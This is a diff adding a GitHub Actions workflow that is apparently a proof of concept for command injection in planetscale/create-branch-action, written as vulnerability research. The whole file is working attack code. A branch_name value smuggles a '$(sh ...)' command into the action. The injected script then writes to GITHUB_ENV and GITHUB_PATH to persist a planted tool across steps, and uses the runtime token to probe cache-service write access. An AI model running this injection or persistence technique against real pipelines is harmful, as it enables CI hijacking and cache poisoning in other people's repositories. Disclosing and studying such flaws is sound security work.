@@ -1,0 +1,82 @@
+name: poc5-persist
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  persist:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Write probe3
+        run: |
+          cat > probe3.sh <<'PROBE'
+          #!/bin/sh
+          # RCE-E follow-up probe: (a) cross-step persistence via the container-mounted
+          # GITHUB_ENV / GITHUB_PATH file commands, (b) results-service cache twirp probe
+          # with redirect handling, (c) artifact env host/length. Token values withheld.
+          TAG="${1:-x}"
+          OUT="/github/workspace/persist_${TAG}.txt"
+          
+          {
+          echo "########## PERSIST PROBE tag=${TAG} ##########"
+          echo "GITHUB_ENV=$GITHUB_ENV"
+          echo "GITHUB_PATH=$GITHUB_PATH"
+          echo "can write GITHUB_ENV: $([ -w "$GITHUB_ENV" ] && echo yes || echo no)"
+          echo "can write GITHUB_PATH: $([ -w "$GITHUB_PATH" ] && echo yes || echo no)"
+          
+          # (a) cross-step persistence: set an env var and inject a PATH entry with a tool
+          echo "RCE_E_MARKER=injected-by-action-container" >> "$GITHUB_ENV" 2>&1 && echo "GITHUB_ENV write: ok" || echo "GITHUB_ENV write: failed"
+          mkdir -p /github/workspace/bin 2>/dev/null
+          cat > /github/workspace/bin/probe-tool <<'EOS'
+          #!/bin/sh
+          echo "probe-tool executed from injected PATH entry; uid=$(id -u)"
+          EOS
+          chmod +x /github/workspace/bin/probe-tool 2>&1
+          echo "/github/workspace/bin" >> "$GITHUB_PATH" 2>&1 && echo "GITHUB_PATH write: ok" || echo "GITHUB_PATH write: failed"
+          
+          # (b) results service twirp cache probe, following the redirect, reporting status/body
+          echo "== twirp GetCacheEntryDownloadURL (follow redirects) =="
+          R=$(curl -s -D /tmp/r.hdr -o /tmp/r.body -w '%{http_code}' --location-trusted --max-time 12 \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H 'Content-Type: application/json' \
+            -X POST -d '{"key":"rcee","restoreKeys":[],"version":"rcee"}' \
+            "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" 2>&1)
+          echo "final HTTP: $R"
+          echo "redirect chain hosts: $(grep -i '^location:' /tmp/r.hdr | sed 's#.*https\?://##; s#/.*##' | tr '\n' ' ')"
+          echo "body: $(head -c 220 /tmp/r.body)"
+          echo "== twirp CreateCacheEntry reserve (write-scope probe, scratch repo only) =="
+          R2=$(curl -s -D /tmp/r2.hdr -o /tmp/r2.body -w '%{http_code}' --location-trusted --max-time 12 \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H 'Content-Type: application/json' \
+            -X POST -d '{"key":"rcee-probe","version":"rcee-probe"}' \
+            "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" 2>&1)
+          echo "final HTTP: $R2"
+          echo "body: $(head -c 220 /tmp/r2.body)"
+          
+          # (c) artifact service env
+          echo "GITHUB_ARTIFACTS length: ${#GITHUB_ARTIFACTS}"
+          echo "GITHUB_ARTIFACTS host: $(echo "$GITHUB_ARTIFACTS" | sed 's#https\?://##; s#/.*##' | head -c 120)"
+          echo "GITHUB_ARTIFACTS_LIST length: ${#GITHUB_ARTIFACTS_LIST}"
+          echo "GITHUB_ARTIFACTS_LIST host: $(echo "$GITHUB_ARTIFACTS_LIST" | sed 's#https\?://##; s#/.*##' | head -c 120)"
+          echo "########## PERSIST PROBE END tag=${TAG} ##########"
+          } >> "$OUT" 2>&1
+          exit 0
+          PROBE
+          chmod +x probe3.sh
+      - name: create-branch-action persist probe
+        uses: planetscale/create-branch-action@allow-duplicates
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'x$(sh /github/workspace/probe3.sh persist)end'
+          check_exists: "false"
+      - name: Print probe evidence
+        run: |
+          echo "--- persist_persist.txt ---"
+          cat persist_persist.txt || echo "no file"
+      - name: Cross-step persistence check (env + PATH)
+        run: |
+          echo "RCE_E_MARKER=$RCE_E_MARKER"
+          command -v probe-tool && probe-tool || echo "probe-tool not on PATH"
